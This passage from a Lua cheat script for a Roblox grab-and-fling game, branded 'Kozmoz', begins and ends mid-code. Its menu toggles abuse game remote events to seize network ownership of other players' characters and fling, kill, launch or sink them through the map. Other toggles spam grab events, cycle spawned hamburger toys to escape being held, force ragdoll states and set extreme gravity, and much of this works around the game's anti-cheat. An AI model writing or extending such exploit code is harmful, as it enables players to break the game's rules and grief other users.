        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = away
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performKill(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
        away = Vector3.new(away.X, 0, away.Z) * 999999999999999
        bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganFling"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = away
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performHeaven(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        root.CFrame = CFrame.new(0, 200, 0)
        bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganHeaven"
        bv.MaxForce = Vector3.new(0, math.huge, 0)
        bv.Velocity = Vector3.new(0, 200, 0)
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performKick(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        root.CFrame = CFrame.new(0, 999999999999, 0)
        bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganHeaven"
        bv.MaxForce = Vector3.new(0, math.huge, 0)
        bv.Velocity = Vector3.new(0, 99999999999999, 0)
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performRagdoll(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganSpy"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(0, -20, 0)
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performHell(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        for _, part in ipairs(attacker.Character:GetDescendants()) do
            if part:IsA("BasePart") and not part.Anchored then
                part.CanCollide = false
            end
        end
        bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganSpy"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(0, -100000000, 0)
        bv.P = 12500
        bv.Parent = root
        local noclipConnection
        noclipConnection = RunService.Heartbeat:Connect(function()
            if not attacker.Character or not attacker.Character.Parent then
                noclipConnection:Disconnect()
                return
            end
            for _, part in ipairs(attacker.Character:GetDescendants()) do
                if part:IsA("BasePart") and not part.Anchored then
                    part.CanCollide = false
                end
            end
        end)
        task.delay(0.01, function()
            if noclipConnection then
                noclipConnection:Disconnect()
            end
        end)
        Debris:AddItem(bv, 0.01)
    end)
end

function performChina(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        root.CFrame = CFrame.new(591, 153, -101)
    end)
end

crazyline = false
function performSpamGrabLines(attacker)
    while crazyline do
        char = LocalPlayer.Character
        if char then
            head = char:FindFirstChild("Head")
            if head then
                owner = head:FindFirstChild("PartOwner")
                if owner and owner:IsA("StringValue") then
                    attacker = Players:FindFirstChild(owner.Value)
                    if attacker and attacker.Character then
                        attackerHead = attacker.Character:FindFirstChild("Head")
                        attackerHRP = attacker.Character:FindFirstChild("HumanoidRootPart")
                        if attackerHead and attackerHRP then
                            for i = 1, 10 do
                                pcall(function()
                                    Services.CreateGrabEvent:FireServer(attackerHead, attackerHead.CFrame)
                                end)
                            end
                            for i = 1, 10 do
                                pcall(function()
                                    Services.CreateGrabEvent:FireServer(attackerHRP, attackerHRP.CFrame)
                                end)
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.01)
    end
end

function startDefense()
    if defenseConnection then
        return
    end
    defenseConnection = RunService.Heartbeat:Connect(function()
        if not defenseEnabled then
            return
        end
        attacker = getAttacker()
        if not attacker then
            return
        end
        if defenseMode == "Fling" then
            performFling(attacker)
        elseif defenseMode == "Kill" then
            performKill(attacker)
        elseif defenseMode == "Send to Heaven" then
            performHeaven(attacker)
        elseif defenseMode == "Kick" then
            performKick(attacker)
        elseif defenseMode == "Ragdoll" then
            performRagdoll(attacker)
        elseif defenseMode == "Hell" then
            performHell(attacker)
        elseif defenseMode == "China" then
            performChina(attacker)
        elseif defenseMode == "GrabLine" then
            performSpamGrabLines(attacker)
        end
    end)
end

function stopDefense()
    if defenseConnection then
        defenseConnection:Disconnect()
        defenseConnection = nil
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        char = plr.Character
        if char then
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("BodyVelocity") and (obj.Name == "RinneganFling" or obj.Name == "RinneganHeaven") then
                    obj:Destroy()
                end
            end
        end
    end
end

Services.LocalPlayer.CharacterAdded:Connect(function()
    if defenseEnabled then
        task.wait(1)
        startDefense()
    end
end)

ClassicDefense:AddToggle("AutoAttack", {
    Text = "Auto Attack",
    Default = false,
    Callback = function(enabled)
        defenseEnabled = enabled
        if enabled then
            startDefense()
        else
            stopDefense()
        end
    end
})

ClassicDefense:AddDropdown("DefenseMode", {
    Values = {"Fling","Kill","Send to Heaven","Kick","Ragdoll","Hell","China","GrabLine"},
    Default = "Fling",
    Callback = function(mode)
        if typeof(mode) == "table" then
            mode = mode[1]
        end
        defenseMode = mode
    end
})

ClassicDefense:AddToggle("AutoReset", {
    Text = "Auto Reset",
    Default = false,
    Callback = function(v)
        if v then
            cons["AutoReset"] = Services.rs.GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == "Flying" then
                    character = Player.Character
                    hum = character and character:FindFirstChild("Humanoid")
                    if hum then
                        hum.Health = 0
                    end
                end
            end)
        else
            if cons["AutoReset"] then 
                cons["AutoReset"]:Disconnect() 
                cons["AutoReset"] = nil
            end
        end
    end
})
ExtraDefense = Tabs.DefenseTab:AddLeftGroupbox("Extra Defense")

local AntiInvisActive = false
local AntiInvisConnection = nil

ExtraDefense:AddToggle("AntiInvis", {
    Text = "Anti Invis",
    Default = false,
    Callback = function(v)
        AntiInvisActive = v
        if AntiInvisConnection then
            AntiInvisConnection:Disconnect()
            AntiInvisConnection = nil
        end
        if v then
            AntiInvisConnection = Services.RunService.Heartbeat:Connect(function()
                for _, player in ipairs(Services.Players:GetPlayers()) do
                    if player == Services.LocalPlayer then continue end
                    local char = player.Character
                    if not char then continue end
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if not hum then continue end
                    if hum.SeatPart ~= nil then continue end
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") and part.Massless == true then
                            part.Massless = false
                        end
                    end
                end
            end)
        end
    end
})

-- =====================================================================
-- [KOZMOZ PORT] Extra Defense kutusuna eklenen musa(4) ozellikleri
--   * Anti Kill (Hamburger) + Anti Hold (Hamburger)  -> musa(4) 6536-6747
--   * Loop Ragdoll / Perm Ragdoll                     -> musa(4) 6372-6535
--   * Gravity Anti Kick                               -> musa(4) 4692-4703
-- Hamburger toggle'lari, istege uygun sekilde Loop Ragdoll'un hemen
-- ustune konuldu. Tumu ortak KozDisp / KozState altyapisini kullanir.
-- =====================================================================
ExtraDefense:AddDivider()

do
    local BurgerMarkerNames = {"AntiKillBurgerMarker", "AntiHoldBurgerMarker", "AntiInputLagBurgerMarker"}
    local function getBurgerMarker(burger)
        if not burger then return nil end
        for _, markerName in ipairs(BurgerMarkerNames) do
            local marker = burger:FindFirstChild(markerName)
            if marker then return markerName end
        end
        return nil
    end
    local function claimBurger(burger, markerName)
        if not burger then return false end
        local existing = getBurgerMarker(burger)
        if existing then return existing == markerName end
        local ok = pcall(function()
            local marker = Instance.new("Part")
            marker.Name = markerName
            marker.Transparency = 1
            marker.CanCollide = false
            marker.CanQuery = false
            marker.CanTouch = false
            marker.Anchored = true
            marker.Size = Vector3.new(0.2, 0.2, 0.2)
            marker.Parent = burger
        end)
        return ok and getBurgerMarker(burger) == markerName
    end
    local function getBurgerHolder(burger)
        local holdPart = burger and burger:FindFirstChild("HoldPart")
        if holdPart then
            local holdingPlayer = holdPart:FindFirstChild("HoldingPlayer")
            holdingPlayer = holdingPlayer and holdingPlayer.Value
            if holdingPlayer and holdingPlayer.Character then
                return holdingPlayer.Character
            end
            local rc = holdPart:FindFirstChild("RigidConstraint")
            if rc and rc.Attachment1 then
                local holder = rc.Attachment1:FindFirstAncestorOfClass("Model")
                if holder then return holder end
            end
        end
        return nil
    end
    local function findOwnBurger(folder, markerName)
        if not folder then return nil end
        local unclaimed
        for _, child in pairs(folder:GetChildren()) do
            if child:IsA("Model") and child.Name:find("FoodHamburger") then
                local holder = getBurgerHolder(child)
                if not holder or holder == KozPLR.Character then
                    local marker = getBurgerMarker(child)
                    if marker == markerName then
                        return child
                    elseif not marker and not unclaimed then
                        unclaimed = child
                    end
                end
            end
        end
        return unclaimed
    end

    ExtraDefense:AddToggle("AntiKillHamburger", {
        Text = "Anti Kill (Hamburger)",
        Default = false,
        Callback = function(v)
            KozFlags.AntiKillHamburger = v
            if not v then KozDisp:Flush() end
            if v then
                if KozState.antiKillSpamConnection then KozState.antiKillSpamConnection:Disconnect() KozState.antiKillSpamConnection = nil end
                local toggle = false
                local lastHoldDrop = 0
                local lastKillSpawn = 0
                local killDeletePending = false
                local HOLD_DROP_INTERVAL = 0.03
                KozState.antiKillSpamConnection = KozRun.Heartbeat:Connect(function()
                    if not KozFlags.AntiKillHamburger then return end
                    local now = tick()
                    if now - lastHoldDrop < HOLD_DROP_INTERVAL then return end
                    lastHoldDrop = now
                    local character = KozPLR.Character
                    if not character or not character:FindFirstChild("Humanoid") or character.Humanoid.Health <= 0 then return end
                    local spawnedFolder = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                    if spawnedFolder then
                        for _, child in pairs(spawnedFolder:GetChildren()) do
                            if child:IsA("Model") and child.Name:find("FoodHamburger") and getBurgerMarker(child) == "AntiKillBurgerMarker" then
                                local h = getBurgerHolder(child)
                                if h and h ~= character then
                                    pcall(function() child.Name = "FoodHamburger_Stolen" end)
                                    pcall(function() KozDisp:Fire(KozRS.MenuToys.DestroyToy, child) end)
                                    killDeletePending = true
                                end
                            end
                        end
                    end
                    local hamburger = spawnedFolder and findOwnBurger(spawnedFolder, "AntiKillBurgerMarker")
                    if hamburger and not claimBurger(hamburger, "AntiKillBurgerMarker") then
                        hamburger = nil
                    end
                    if hamburger and hamburger.Name == "FoodHamburger" then
                        hamburger.Name = "FoodHamburger_Kill"
                    end
                    if not hamburger or not hamburger:FindFirstChild("HoldPart") then
                        if killDeletePending or now - lastKillSpawn > 0.4 then
                            pcall(function()
                                KozDisp:Invoke(KozRS.MenuToys.SpawnToyRemoteFunction,
                                    "FoodHamburger",
                                    CFrame.new(0, 300, 0),
                                    Vector3.new(0, 0, 0)
                                )
                            end)
                            lastKillSpawn = now
                            killDeletePending = false
                        end
                        toggle = false
                        return
                    end
                    local holder = getBurgerHolder(hamburger)
                    if holder and holder ~= character then
                        pcall(function() hamburger.Name = "FoodHamburger_Stolen" end)
                        pcall(function()
                            KozDisp:Fire(KozRS.MenuToys.DestroyToy, hamburger)
                        end)
                        killDeletePending = true
                        toggle = false
                        return
                    end
                    for _, part in hamburger:GetDescendants() do
                        if part:IsA("BasePart") then part.CanCollide = false end
                    end
                    toggle = not toggle
                    if toggle then
                        pcall(function()
                            KozDisp:Invoke(hamburger.HoldPart.HoldItemRemoteFunction, hamburger, character)
                        end)
                    else
                        pcall(function()
                            local myHRP = character and character:FindFirstChild("HumanoidRootPart")
                            local dropCF = myHRP and (myHRP.CFrame + Vector3.new(0, 4, 0)) or CFrame.new(0, 300, 0)
                            KozDisp:Invoke(hamburger.HoldPart.DropItemRemoteFunction,
                                hamburger,
                                dropCF,
                                Vector3.new(0, 0, 0)
                            )
                        end)
                    end
                end)
            else
                if KozState.antiKillSpamConnection then KozState.antiKillSpamConnection:Disconnect() KozState.antiKillSpamConnection = nil end
                local spawnedFolder = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                local hamburger = spawnedFolder and findOwnBurger(spawnedFolder, "AntiKillBurgerMarker")
                if hamburger and getBurgerMarker(hamburger) == "AntiKillBurgerMarker" and hamburger:FindFirstChild("HoldPart") then
                    pcall(function()
                        local myHRP = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
                        local dropCF = myHRP and (myHRP.CFrame + Vector3.new(0, 4, 0)) or CFrame.new(0, 300, 0)
                        KozDisp:Invoke(
                            hamburger.HoldPart.DropItemRemoteFunction,
                            hamburger,
                            dropCF,
                            Vector3.new(0, 0, 0)
                        )
                    end)
                end
            end
        end
    })

    ExtraDefense:AddToggle("AntiHoldHamburger", {
        Text = "Anti Hold (Hamburger)",
        Default = false,
        Callback = function(v)
            KozFlags.AntiHoldHamburger = v
            if not v then KozDisp:Flush() end
            if v then
                if KozState.antiHoldSpamConnection then KozState.antiHoldSpamConnection:Disconnect() KozState.antiHoldSpamConnection = nil end
                local lastHold = 0
                local HOLD_INTERVAL = 0.05
                KozState.antiHoldSpamConnection = KozRun.Heartbeat:Connect(function()
                    if not KozFlags.AntiHoldHamburger then return end
                    local now = tick()
                    if now - lastHold < HOLD_INTERVAL then return end
                    lastHold = now
                    local character = KozPLR.Character
                    if not character or not character:FindFirstChild("Humanoid") or character.Humanoid.Health <= 0 then return end
                    local spawnedFolder = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                    local hamburger = spawnedFolder and findOwnBurger(spawnedFolder, "AntiHoldBurgerMarker")
                    if hamburger and not claimBurger(hamburger, "AntiHoldBurgerMarker") then
                        hamburger = nil
                    end
                    if hamburger and hamburger.Name == "FoodHamburger" then
                        hamburger.Name = "FoodHamburger_Hold"
                    end
                    if not hamburger or not hamburger:FindFirstChild("HoldPart") then
                        pcall(function()
                            KozDisp:Invoke(KozRS.MenuToys.SpawnToyRemoteFunction,
                                "FoodHamburger",
                                CFrame.new(0, 300, 0),
                                Vector3.new(0, 0, 0)
                            )
                        end)
                        return
                    end
                    local holder = getBurgerHolder(hamburger)
                    if holder and holder ~= character then
                        pcall(function()
                            KozDisp:Fire(KozRS.MenuToys.DestroyToy, hamburger)
                        end)
                        return
                    elseif holder == character then
                        return
                    end
                    for _, part in hamburger:GetDescendants() do
                        if part:IsA("BasePart") then part.CanCollide = false end
                    end
                    pcall(function()
                        KozDisp:Invoke(hamburger.HoldPart.HoldItemRemoteFunction, hamburger, character)
                    end)
                end)
            else
                if KozState.antiHoldSpamConnection then KozState.antiHoldSpamConnection:Disconnect() KozState.antiHoldSpamConnection = nil end
            end
        end
    })

    ExtraDefense:AddToggle("LoopRagdoll", {
        Text = "Loop Ragdoll",
        Default = false,
        Callback = function(v)
            KozFlags.LoopRagdoll = v
            if v then
                if KozState.loopRagdollTask then pcall(function() task.cancel(KozState.loopRagdollTask) end) KozState.loopRagdollTask = nil end
                if KozState.loopRagdollCharAdded then KozState.loopRagdollCharAdded:Disconnect() KozState.loopRagdollCharAdded = nil end
                KozState.loopRagdollTask = task.spawn(function()
                    local function cleanupHRPMovers(char)
                        if not char then return end
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            for _, obj in ipairs(hrp:GetChildren()) do
                                if obj.Name == "LoopRagdollGyro" then
                                    pcall(function() obj:Destroy() end)
                                end
                            end
                        end
                    end
                    local function stabilizeHRP(r)
                        if not r or not r.Parent or not KozUtil.isLocalAlive() then return end
                        local gy = r:FindFirstChild("LoopRagdollGyro")
                        if not gy then
                            gy = Instance.new("BodyGyro")
                            gy.Name = "LoopRagdollGyro"
                            gy.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            gy.P = 30000
                            gy.D = 500
                            gy.Parent = r
                        end
                        gy.CFrame = CFrame.new(r.Position) * (r.CFrame - r.CFrame.Position)
                        r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, 0, r.AssemblyLinearVelocity.Z)
                    end
                    while KozFlags.LoopRagdoll do
                        task.wait(0.05)
                        if not KozUtil.isLocalAlive() then
                            local c = KozPLR.Character
                            if c then cleanupHRPMovers(c) end
                            continue
                        end
                        local c = KozPLR.Character
                        local h = c and c:FindFirstChildOfClass("Humanoid")
                        local r = c and c:FindFirstChild("HumanoidRootPart")
                        if not h or not r or h.Health <= 0 or KozState.isRespawning then
                            if c then cleanupHRPMovers(c) end
                            continue
                        end
                        h.BreakJointsOnDeath = false
                        KozDisp:Fire(KozRemote.RagdollRemote, r, 2)
                        h.PlatformStand = true
                        stabilizeHRP(r)
                        local ragdollEnd = tick() + (KozFlags.LoopRagdollSpeed or 0.15)
                        while KozFlags.LoopRagdoll and tick() < ragdollEnd do
                            task.wait()
                            if not KozUtil.isLocalAlive() then break end
                            c = KozPLR.Character
                            h = c and c:FindFirstChildOfClass("Humanoid")
                            r = c and c:FindFirstChild("HumanoidRootPart")
                            if not h or not r or h.Health <= 0 or KozState.isRespawning then break end
                            stabilizeHRP(r)
                        end
                        if not KozUtil.isLocalAlive() then
                            if c then cleanupHRPMovers(c) end
                            continue
                        end
                        c = KozPLR.Character
                        h = c and c:FindFirstChildOfClass("Humanoid")
                        r = c and c:FindFirstChild("HumanoidRootPart")
                        if not h or not r or h.Health <= 0 or KozState.isRespawning then
                            if c then cleanupHRPMovers(c) end
                            continue
                        end
                        KozDisp:Fire(KozRemote.RagdollRemote, r, 0)
                        h.PlatformStand = false
                        h:ChangeState(Enum.HumanoidStateType.GettingUp)
                        cleanupHRPMovers(c)
                    end
                    local c = KozPLR.Character
                    if c then cleanupHRPMovers(c) end
                end)
                if KozState.loopRagdollCharAdded then KozState.loopRagdollCharAdded:Disconnect() end
                KozState.loopRagdollCharAdded = KozPLR.CharacterAdded:Connect(function(newChar)
                    if not KozFlags.LoopRagdoll then
                        if KozState.loopRagdollCharAdded then KozState.loopRagdollCharAdded:Disconnect() KozState.loopRagdollCharAdded = nil end
                        return
                    end
                    task.wait(0.6)
                    if not KozFlags.LoopRagdoll or not KozUtil.isLocalAlive() then return end
                    local h = newChar:WaitForChild("Humanoid", 5)
                    local r = newChar:WaitForChild("HumanoidRootPart", 5)
                    if h and r and h.Health > 0 and KozUtil.isLocalAlive() then
                        h.BreakJointsOnDeath = false
                        KozDisp:Fire(KozRemote.RagdollRemote, r, 2)
                        h.PlatformStand = true
                        pcall(function()
                            local gy = Instance.new("BodyGyro")
                            gy.Name = "LoopRagdollGyro"
                            gy.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            gy.P = 30000
                            gy.D = 500
                            gy.CFrame = r.CFrame
                            gy.Parent = r
                        end)
                    end
                end)
            else
                if KozState.loopRagdollTask then pcall(function() task.cancel(KozState.loopRagdollTask) end) KozState.loopRagdollTask = nil end
                if KozState.loopRagdollCharAdded then KozState.loopRagdollCharAdded:Disconnect() KozState.loopRagdollCharAdded = nil end
                local c = KozPLR.Character
                local h = c and c:FindFirstChildOfClass("Humanoid")
                local r = c and c:FindFirstChild("HumanoidRootPart")
                if h and r and h.Health > 0 then
                    KozDisp:Fire(KozRemote.RagdollRemote, r, 0)
                    h.PlatformStand = false
                    h:ChangeState(Enum.HumanoidStateType.GettingUp)
                    for _, obj in ipairs(r:GetChildren()) do
                        if obj.Name == "LoopRagdollGyro" then
                            pcall(function() obj:Destroy() end)
                        end
                    end
                end
            end
        end
    })

    ExtraDefense:AddToggle("PermRagdoll", {
        Text = "Perm Ragdoll",
        Default = false,
        Callback = function(v)
            KozFlags.PermRagdoll = v
            if v then
                if KozState.permRagdollConn then KozState.permRagdollConn:Disconnect() KozState.permRagdollConn = nil end
                if KozState.permRagdollCharAdded then KozState.permRagdollCharAdded:Disconnect() KozState.permRagdollCharAdded = nil end
                local function applyPermRagdoll()
                    local char = KozPLR.Character
                    if not char then return end
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hum and hrp and hum.Health > 0 and not KozState.isRespawning then
                        hum.BreakJointsOnDeath = false
                        KozDisp:Fire(KozRemote.RagdollRemote, hrp, 2)
                        hum.PlatformStand = true
                    end
                end
                applyPermRagdoll()
                KozState.permRagdollConn = KozRun.RenderStepped:Connect(function()
                    if not KozFlags.PermRagdoll then return end
                    applyPermRagdoll()
                end)
                KozState.permRagdollCharAdded = KozPLR.CharacterAdded:Connect(function(newChar)
                    if not KozFlags.PermRagdoll then return end
                    task.wait(0.2)
                    if KozFlags.PermRagdoll and KozUtil.isLocalAlive() then
                        applyPermRagdoll()
                    end
                end)
            else
                if KozState.permRagdollConn then KozState.permRagdollConn:Disconnect() KozState.permRagdollConn = nil end
                if KozState.permRagdollCharAdded then KozState.permRagdollCharAdded:Disconnect() KozState.permRagdollCharAdded = nil end
                local char = KozPLR.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hum and hrp and hum.Health > 0 then
                    KozDisp:Fire(KozRemote.RagdollRemote, hrp, 0)
                    hum.PlatformStand = false
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end
    })

    -- Gravity Anti Kick (musa(4) 4692): kozmoz'da gravity ayari olmadigi
    -- icin acmadan onceki deger hatirlanip geri yuklenir.
    ExtraDefense:AddToggle("GravityAntiKick", {
        Text = "Gravity Anti Kick",
        Default = false,
        Callback = function(v)
            KozFlags.GravityAntiKick = v
            if v then
                if getgenv().KozGravityBefore == nil then
                    getgenv().KozGravityBefore = KozWS.Gravity
                end
                KozWS.Gravity = 1000000
            else
                KozWS.Gravity = getgenv().KozGravityBefore or 100
                getgenv().KozGravityBefore = nil
            end
        end
    })
    -- [KOZMOZ PORT] Anti Banana (musa(4) 7381-7409 "Anti Banana Sit"): muz
    -- kabuguna oturtulup ragdoll/olm kisiri na yapilmayi engeller.
    ExtraDefense:AddToggle("KozAntiBanana", {
        Text = "Anti Banana",
        Default = false,
        Callback = function(v)
            KozFlags.AntiBananaSit = v
            if v then
                if KozState.antiBananaSitConn then
                    pcall(task.cancel, KozState.antiBananaSitConn)
                end
                KozState.antiBananaSitConn = task.spawn(function()
                    while KozFlags.AntiBananaSit do
                        task.wait(0.05)
                        local char = KozPLR.Character
                        local hum = char and char:FindFirstChild("Humanoid")
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if hum and hrp and hum.Health > 0 and not KozState.isRespawning then
                            hum.Sit = true
                            hum:ChangeState(Enum.HumanoidStateType.Running)
                            local cam = KozWS.CurrentCamera
                            if cam then
                                local lookVec = cam.CFrame.LookVector
                                local dir = Vector3.new(lookVec.X, 0, lookVec.Z)
                                if dir.Magnitude > 0.01 then
                                    hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + dir.Unit)
                                end
                            end
                        end
                    end
                end)
            else
                if KozState.antiBananaSitConn then
                    pcall(task.cancel, KozState.antiBananaSitConn)
                    KozState.antiBananaSitConn = nil
                end
                local char = KozPLR.Character
                local hum = char and char:FindFirstChild("Humanoid")
                if hum then
                    pcall(function() hum.Sit = false end)
                end
            end
        end
    })

    -- [KOZMOZ] "Anti Banana (Held Player)": tuttugum kisi suya / zehir hendege
    -- isinlanmasini engeller; elimdeki oyuncunun konumunu korur + onda da
    -- banana sit kilidini karistirir. Toggle kapatilinca birakilan kisiye dokunmaz.
    local function kozHeldCharacter()
        for _, p in ipairs(KozPlayers:GetPlayers()) do
            if p ~= KozPLR then
                local char = p.Character
                local head = char and char:FindFirstChild("Head")
                local owner = head and head:FindFirstChild("PartOwner")
                if owner and owner.Value == KozPLR.Name then
                    return char
                end
            end
        end
        return nil
    end

    ExtraDefense:AddToggle("KozAntiBananaHeld", {
        Text = "Anti Banana (Held Player)",
        Default = false,
        Callback = function(v)
            KozFlags.AntiBananaHeld = v
            if v then
                if KozState.antiBananaHeldConn then
                    pcall(task.cancel, KozState.antiBananaHeldConn)
                end
                KozState.antiBananaHeldConn = task.spawn(function()
                    local lastWarn = 0
                    while KozFlags.AntiBananaHeld do
                        task.wait(0.05)
                        local held = kozHeldCharacter()
                        local myChar = KozPLR.Character
                        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        if held and myRoot then
                            local hrp = held:FindFirstChild("HumanoidRootPart")
                            local hum = held:FindFirstChild("Humanoid")
                            if hrp then
                                local heldPos = hrp.Position
                                local mine = myRoot.Position
                                local fallen = heldPos.Y < -40
                                local flung = (heldPos - mine).Magnitude > 150
                                if fallen or flung then
                                    -- suya/hendege isinlanan kisiyi tekrar elimize al
                                    pcall(function()
                                        hrp.CFrame = myRoot.CFrame * CFrame.new(0, 6, 0)
                                        hrp.AssemblyLinearVelocity = Vector3.zero
                                        hrp.AssemblyAngularVelocity = Vector3.zero
                                    end)
                                    if tick() - lastWarn > 2 then
                                        lastWarn = tick()
                                        pcall(function()
                                            Library:Notify({
                                                Title = "Kozmoz",
                                                Description = "Anti Banana (Held Player): " .. held.Name .. " was teleported out - pulled back.",
                                                Time = 4,
                                            })
                                        end)
                                    end
                                end
                                if hum then
                                    pcall(function()
                                        hum.Sit = false
                                        hum:ChangeState(Enum.HumanoidStateType.Running)
                                    end)
                                end
                            end
                        end
                    end
                end)
            else
                if KozState.antiBananaHeldConn then
                    pcall(task.cancel, KozState.antiBananaHeldConn)
                    KozState.antiBananaHeldConn = nil
                end
            end
        end
    })
end

ClassicDefense:AddToggle("Autoleave", {
    Text = "Auto Leave",
    Default = false,
    Callback = function(v)
        if _G.AutoLeaveCon then _G.AutoLeaveCon:Disconnect() end
        if v then
            local warnTimestamps = {}
            _G.AutoLeaveCon = game:GetService("ReplicatedStorage").GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == "Flying" then
                    local currentTime = os.clock()
                    table.insert(warnTimestamps, currentTime)
                    for i = #warnTimestamps, 1, -1 do
                        if currentTime - warnTimestamps[i] > 1 then
                            table.remove(warnTimestamps, i)
                        end
                    end
                    if #warnTimestamps >= 3 then
                        game:GetService("Players").LocalPlayer:Kick("KOZMOZ Safety: Disconnected to prevent a kick.")
                    end
                end
            end)
        end
    end
})
ClassicDefense:AddDivider()

ClassicDefense:AddLabel("Input & Paint", true, Color3.fromRGB(255, 160, 0))

ClassicDefense:AddDropdown("AntiInputToySelect", {
	Text = "Select Input Lag Toy",
	Values = toyDropdownValues,
	Default = "Burger",
	Callback = function(Value)
		SelectedFood = ToyList[Value]
	end
})

ClassicDefense:AddSlider("AntiInputHoldDuration", {
	Text = "Hold Duration",
	Default = 0.02,
	Min = 0.01,
	Max = 1.0,
	Rounding = 2,
	Callback = function(Value)
		getgenv().AntiInputHoldDuration = Value
	end
})

ClassicDefense:AddSlider("AntiInputCycleSpeed", {
	Text = "Cycle Speed",
	Default = 0.02,
	Min = 0.01,
	Max = 1.0,
	Rounding = 2,
	Callback = function(Value)
		getgenv().AntiInputCycleSpeed = Value
	end
})

ClassicDefense:AddToggle("AntiInput", {
	Text = "Anti Input Lag",
	Default = false,
	Callback = function(v)
		getgenv().AntiInputEnabled = v
		if v then
			task.spawn(function()
				local plr = game.Players.LocalPlayer
				local RS = game:GetService("ReplicatedStorage")
				local SpawnRemote = RS:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
				while getgenv().AntiInputEnabled do
					local char = plr.Character
					local hrp = char and char:FindFirstChild("HumanoidRootPart")
					if hrp then
						local toysFolder = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
						local name = SelectedFood 
						local item = toysFolder and toysFolder:FindFirstChild(name)
						for _, obj in pairs(workspace:GetChildren()) do
							if obj.Name == "Shuriken" and obj:IsA("Model") then
								for _, part in pairs(obj:GetDescendants()) do
									if part:IsA("BasePart") then 
										part.CanCollide = false 
										part.Massless = true 
									end
								end
							end
						end
						if not item or not item.Parent then
							task.spawn(function()
								pcall(function()
									SpawnRemote:InvokeServer(name, hrp.CFrame * CFrame.new(0, -12, 0), Vector3.zero)
								end)
							end)
							task.wait(0.1)
						else
							local holdPart = item:FindFirstChild("HoldPart")
							if holdPart then
								for _, v in pairs(item:GetDescendants()) do
									if v:IsA("BasePart") then 
										v.CanCollide = false 
										v.Massless = true 
									end
								end
								task.spawn(function()
									pcall(function()
										holdPart.HoldItemRemoteFunction:InvokeServer(item, char)
									end)
								end)
								task.wait(getgenv().AntiInputHoldDuration or 0.02)
								task.spawn(function()
									pcall(function()
										holdPart.DropItemRemoteFunction:InvokeServer(
											item, 
